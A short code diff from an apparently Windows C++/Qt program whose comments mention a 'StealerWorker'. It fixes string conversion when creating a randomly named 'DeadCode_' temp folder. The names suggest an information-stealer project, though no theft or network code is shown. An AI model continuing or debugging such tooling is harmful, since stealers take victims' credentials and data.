@@ -34,7 +34,7 @@ typedef struct _THREAD_BASIC_INFORMATION {
 
 // Глобальные переменные
 std::mutex g_mutex;
-MainWindow* g_mainWindow = nullptr; // Возвращена
+MainWindow* g_mainWindow = nullptr;
 Gdiplus::GdiplusStartupInput gdiplusStartupInput;
 ULONG_PTR gdiplusToken;
 
@@ -55,8 +55,8 @@ int main(int argc, char *argv[]) {
     w.show();
 
     // Создание временной директории для StealerWorker
-    QString tempDir = QString::fromStdString(std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp")) +
-                      "\\DeadCode_" + w.generateRandomString(8);
+    QString tempDir = QString::fromStdString(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") +
+                      "\\DeadCode_" + QString::fromStdString(w.generateRandomString(8));
     QDir dir;
     if (!dir.exists(tempDir)) {
         dir.mkpath(tempDir);
